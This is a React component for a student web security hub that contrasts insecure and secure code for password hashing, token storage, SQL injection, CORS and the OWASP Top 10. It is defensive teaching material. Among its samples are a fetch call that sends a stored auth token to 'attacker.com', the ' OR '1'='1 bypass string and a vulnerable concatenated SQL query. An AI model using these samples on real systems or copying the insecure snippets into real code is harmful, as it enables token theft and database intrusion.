import React, { useState } from 'react';
import { 
  BookOpen, 
  ShieldCheck, 
  Key, 
  Lock, 
  Database, 
  Globe, 
  FileCode, 
  AlertTriangle, 
  CheckCircle2, 
  Check, 
  Copy, 
  ExternalLink, 
  ShieldAlert, 
  Lightbulb 
} from 'lucide-react';

export default function LearningHub() {
  const [activeTab, setActiveTab] = useState('passwords');
  const [copiedId, setCopiedId] = useState(null);

  const handleCopy = (id, text) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="container py-4">
      {/* Header */}
      <div className="mb-4 text-center px-2">
        <span className="badge bg-info text-dark border border-info px-3 py-1.5 mb-2 fw-bold" style={{ fontSize: '0.75rem' }}>
          SECURITY KNOWLEDGE BASE FOR STUDENTS
        </span>
        <h2 className="text-white fw-extrabold">Web Security Learning Hub</h2>
        <p className="text-muted" style={{ maxWidth: 650, margin: '0 auto' }}>
          Essential security principles, OWASP Top 10 guidelines, and copy-paste secure code recipes designed specifically for student and beginner developers.
        </p>
      </div>

      {/* Topics Tabs (Responsive Scrollable Row on Mobile) */}
      <div className="d-flex flex-nowrap justify-content-start justify-content-md-center gap-2 overflow-x-auto pb-3 mb-4 px-1">
        <button 
          className={`btn px-3 py-2 fw-bold d-flex align-items-center gap-2 rounded-pill text-nowrap flex-shrink-0 ${activeTab === 'passwords' ? 'btn-info text-dark shadow' : 'btn-dark text-light border-secondary'}`}
          onClick={() => setActiveTab('passwords')}
        >
          <Key size={16} />
          <span>Password & Hashing</span>
        </button>

        <button 
          className={`btn px-3 py-2 fw-bold d-flex align-items-center gap-2 rounded-pill text-nowrap flex-shrink-0 ${activeTab === 'sessions' ? 'btn-info text-dark shadow' : 'btn-dark text-light border-secondary'}`}
          onClick={() => setActiveTab('sessions')}
        >
          <Lock size={16} />
          <span>Cookies & JWTs</span>
        </button>

        <button 
          className={`btn px-3 py-2 fw-bold d-flex align-items-center gap-2 rounded-pill text-nowrap flex-shrink-0 ${activeTab === 'injection' ? 'btn-info text-dark shadow' : 'btn-dark text-light border-secondary'}`}
          onClick={() => setActiveTab('injection')}
        >
          <Database size={16} />
          <span>SQL & NoSQL Injection</span>
        </button>

        <button 
          className={`btn px-3 py-2 fw-bold d-flex align-items-center gap-2 rounded-pill text-nowrap flex-shrink-0 ${activeTab === 'headers' ? 'btn-info text-dark shadow' : 'btn-dark text-light border-secondary'}`}
          onClick={() => setActiveTab('headers')}
        >
          <Globe size={16} />
          <span>CORS & Headers</span>
        </button>

        <button 
          className={`btn px-3 py-2 fw-bold d-flex align-items-center gap-2 rounded-pill text-nowrap flex-shrink-0 ${activeTab === 'owasp' ? 'btn-info text-dark shadow' : 'btn-dark text-light border-secondary'}`}
          onClick={() => setActiveTab('owasp')}
        >
          <ShieldCheck size={16} />
          <span>OWASP Top 10 Summary</span>
        </button>
      </div>

      {/* Tab Content */}
      <div className="sc-card p-3 p-md-5 mb-4">
        {/* Passwords & Hashing */}
        {activeTab === 'passwords' && (
          <div>
            <div className="d-flex align-items-center gap-2 mb-3 text-info">
              <Key size={24} />
              <h3 className="text-white fw-bold m-0">Password Storage & Salting</h3>
            </div>
            <p className="text-light opacity-90 mb-4">
              Never store raw passwords or use fast cryptographic hashes like MD5/SHA256. Passwords require <em>slow, adaptive hashing algorithms</em> that resist parallel GPU cracking.
            </p>

            <div className="row g-4 mb-4">
              {/* Insecure Red Card */}
              <div className="col-md-6">
                <div 
                  className="p-3.5 rounded h-100"
                  style={{
                    backgroundColor: 'rgba(239, 68, 68, 0.06)',
                    border: '1px solid rgba(239, 68, 68, 0.35)'
                  }}
                >
                  <span className="text-danger fw-bold d-flex align-items-center gap-1.5 mb-2.5">
                    <AlertTriangle size={17} />
                    <span>Insecure Practice (Common Mistake):</span>
                  </span>
                  <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`// 1. Plaintext (Never do this!)
db.users.save({ email, password: plainPassword });

// 2. MD5 / SHA-256 (Can be cracked in seconds)
const hash = crypto.createHash('md5').update(password).digest('hex');`}</code></pre>
                </div>
              </div>

              {/* Secure Green Card (Matching Red Card Style) */}
              <div className="col-md-6">
                <div 
                  className="p-3.5 rounded h-100"
                  style={{
                    backgroundColor: 'rgba(16, 185, 129, 0.06)',
                    border: '1px solid rgba(16, 185, 129, 0.35)'
                  }}
                >
                  <span className="text-success fw-bold d-flex align-items-center gap-1.5 mb-2.5">
                    <CheckCircle2 size={17} />
                    <span>Secure Implementation (Bcrypt):</span>
                  </span>
                  <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`// USE BCRYPT (Node.js)
const bcrypt = require('bcryptjs');
const passwordHash = await bcrypt.hash(plainPassword, 12);

// Verification:
const isMatch = await bcrypt.compare(plainPassword, storedHash);`}</code></pre>
                </div>
              </div>
            </div>

            <div className="p-3 rounded bg-dark border border-secondary border-opacity-25 d-flex align-items-start gap-2.5">
              <Lightbulb size={20} className="text-info mt-0.5 flex-shrink-0" />
              <div>
                <h6 className="text-info fw-bold mb-1">Golden Rule of Password Hashing:</h6>
                <p className="text-muted small m-0">
                  Salt rounds (cost factor) should be at least <strong>12</strong>. Salting ensures two users with the exact same password ('password123') produce completely different hash strings in your database.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Cookies & JWTs */}
        {activeTab === 'sessions' && (
          <div>
            <div className="d-flex align-items-center gap-2 mb-3 text-info">
              <Lock size={24} />
              <h3 className="text-white fw-bold m-0">Session Cookies vs. LocalStorage</h3>
            </div>
            <p className="text-light opacity-90 mb-4">
              One of the most common beginner vulnerabilities is saving JWT access tokens into <code>localStorage</code>. Any Cross-Site Scripting (XSS) vulnerability can immediately exfiltrate tokens from <code>localStorage</code>.
            </p>

            <div className="row g-4 mb-4">
              {/* Insecure Red Card */}
              <div className="col-md-6">
                <div 
                  className="p-3.5 rounded h-100"
                  style={{
                    backgroundColor: 'rgba(239, 68, 68, 0.06)',
                    border: '1px solid rgba(239, 68, 68, 0.35)'
                  }}
                >
                  <span className="text-danger fw-bold mb-2.5 d-flex align-items-center gap-1.5">
                    <AlertTriangle size={17} />
                    <span>Risky (LocalStorage):</span>
                  </span>
                  <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`// In frontend JavaScript:
localStorage.setItem('auth_token', token);

// Danger: Any third-party script can do:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('auth_token'))`}</code></pre>
                </div>
              </div>

              {/* Secure Green Card */}
              <div className="col-md-6">
                <div 
                  className="p-3.5 rounded h-100"
                  style={{
                    backgroundColor: 'rgba(16, 185, 129, 0.06)',
                    border: '1px solid rgba(16, 185, 129, 0.35)'
                  }}
                >
                  <span className="text-success fw-bold mb-2.5 d-flex align-items-center gap-1.5">
                    <CheckCircle2 size={17} />
                    <span>Secure (HttpOnly Cookie):</span>
                  </span>
                  <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`// In Backend (Express / Node.js):
res.cookie('token', jwtToken, {
  httpOnly: true, // Inaccessible to JavaScript
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 24 * 60 * 60 * 1000
});`}</code></pre>
                </div>
              </div>
            </div>

            <div className="p-3 rounded bg-dark border border-secondary border-opacity-25 d-flex align-items-start gap-2.5">
              <Lightbulb size={20} className="text-info mt-0.5 flex-shrink-0" />
              <div>
                <h6 className="text-info fw-bold mb-1">Session Security Best Practice:</h6>
                <p className="text-muted small m-0">
                  Always use the <code>httpOnly</code> flag so JavaScript cannot read the token, and <code>sameSite: 'lax'</code> or <code>'strict'</code> to prevent CSRF attacks.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* SQL & NoSQL Injection */}
        {activeTab === 'injection' && (
          <div>
            <div className="d-flex align-items-center gap-2 mb-3 text-info">
              <Database size={24} />
              <h3 className="text-white fw-bold m-0">SQL & NoSQL Injection Defense</h3>
            </div>
            <p className="text-light opacity-90 mb-4">
              Injection occurs when untrusted user input is directly concatenated into database commands. Attackers can bypass authentication with queries like <code>' OR '1'='1</code>.
            </p>

            <div className="row g-4 mb-4">
              {/* Insecure Red Card */}
              <div className="col-md-6">
                <div 
                  className="p-3.5 rounded h-100"
                  style={{
                    backgroundColor: 'rgba(239, 68, 68, 0.06)',
                    border: '1px solid rgba(239, 68, 68, 0.35)'
                  }}
                >
                  <span className="text-danger fw-bold mb-2.5 d-flex align-items-center gap-1.5">
                    <AlertTriangle size={17} />
                    <span>Vulnerable Concatenation:</span>
                  </span>
                  <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`// SQL Injection flaw:
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
db.query(query);`}</code></pre>
                </div>
              </div>

              {/* Secure Green Card */}
              <div className="col-md-6">
                <div 
                  className="p-3.5 rounded h-100"
                  style={{
                    backgroundColor: 'rgba(16, 185, 129, 0.06)',
                    border: '1px solid rgba(16, 185, 129, 0.35)'
                  }}
                >
                  <span className="text-success fw-bold mb-2.5 d-flex align-items-center gap-1.5">
                    <CheckCircle2 size={17} />
                    <span>Parameterized Queries (Prepared Statements):</span>
                  </span>
                  <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`// Safe parameterized query:
const query = "SELECT * FROM users WHERE email = $1";
db.query(query, [req.body.email]);`}</code></pre>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* CORS & Headers */}
        {activeTab === 'headers' && (
          <div>
            <div className="d-flex align-items-center gap-2 mb-3 text-info">
              <Globe size={24} />
              <h3 className="text-white fw-bold m-0">CORS & Security HTTP Headers</h3>
            </div>
            <p className="text-light opacity-90 mb-4">
              Cross-Origin Resource Sharing (CORS) controls which domains can talk to your API. Never configure <code>origin: '*'</code> when sending credentials or cookies.
            </p>

            <div className="p-3 rounded bg-dark border border-secondary border-opacity-30 mb-4">
              <h6 className="text-white fw-bold mb-2">Helmet.js for Express:</h6>
              <pre className="text-light small m-0" style={{ lineHeight: 1.5 }}><code>{`const helmet = require('helmet');
const cors = require('cors');

app.use(helmet()); // Sets 15+ secure HTTP headers automatically

app.use(cors({
  origin: 'https://mytrustedfrontend.com',
  credentials: true
}));`}</code></pre>
            </div>
          </div>
        )}

        {/* OWASP Top 10 */}
        {activeTab === 'owasp' && (
          <div>
            <div className="d-flex align-items-center gap-2 mb-3 text-info">
              <ShieldCheck size={24} />
              <h3 className="text-white fw-bold m-0">OWASP Top 10 Cheat Sheet for Students</h3>
            </div>

            <div className="d-flex flex-column gap-3">
              {[
                { rank: 'A01', title: 'Broken Access Control', desc: 'Users can act outside of their intended permissions (e.g. modifying another user\'s profile by changing the ID in the URL).' },
                { rank: 'A02', title: 'Cryptographic Failures', desc: 'Transmitting data over HTTP instead of HTTPS, or storing sensitive passwords in plaintext or MD5.' },
                { rank: 'A03', title: 'Injection (SQL, NoSQL, OS Command)', desc: 'User-supplied data is not validated or parameterized by the application.' },
                { rank: 'A05', title: 'Security Misconfiguration', desc: 'Leaving default passwords, keeping DEBUG=True in production, or enabling unnecessary framework features.' },
                { rank: 'A07', title: 'Identification and Authentication Failures', desc: 'Allowing automated brute-force attacks, weak passwords, or missing rate limiting on login routes.' }
              ].map((item, idx) => (
                <div key={idx} className="p-3 rounded bg-dark border border-secondary border-opacity-30">
                  <div className="d-flex align-items-center gap-2 mb-1">
                    <span className="badge bg-info text-dark fw-bold">{item.rank}</span>
                    <h6 className="text-white fw-bold m-0">{item.title}</h6>
                  </div>
                  <p className="text-muted small m-0">{item.desc}</p>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
